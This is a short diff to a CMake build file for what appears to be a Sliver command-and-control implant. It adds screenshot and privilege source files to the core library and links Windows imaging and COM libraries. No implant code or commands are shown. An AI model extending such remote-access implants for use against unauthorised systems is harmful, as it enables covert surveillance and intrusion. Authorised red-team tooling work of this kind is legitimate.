@@ -123,6 +123,8 @@ set(SLIVER_CORE_SOURCES
   src/platform/${SLIVER_PLATFORM_DIR}/proc.c
   src/platform/${SLIVER_PLATFORM_DIR}/exec.c
   src/platform/${SLIVER_PLATFORM_DIR}/registry.c
+  src/platform/${SLIVER_PLATFORM_DIR}/screenshot.c
+  src/platform/${SLIVER_PLATFORM_DIR}/privs.c
 )
 if(IMPLANT_CRYPTO)
   list(APPEND SLIVER_CORE_SOURCES
@@ -147,7 +149,7 @@ endif()
 # PIC is required when the SHARED artifact links this static library.
 set_target_properties(sliver_core PROPERTIES POSITION_INDEPENDENT_CODE ON)
 if(WIN32)
-  target_link_libraries(sliver_core PUBLIC ws2_32 iphlpapi)
+  target_link_libraries(sliver_core PUBLIC ws2_32 iphlpapi windowscodecs ole32)
 endif()
 sliver_apply_warnings(sliver_core)
 target_compile_definitions(sliver_core PRIVATE _CRT_SECURE_NO_WARNINGS
@@ -188,6 +190,8 @@ if(BUILD_TESTING)
 endif()
 
 message(STATUS "sliver_implant: format=${IMPLANT_FORMAT} platform=${SLIVER_PLATFORM_DIR} compiler=${CMAKE_C_COMPILER_ID}")
+
+
 
 
 
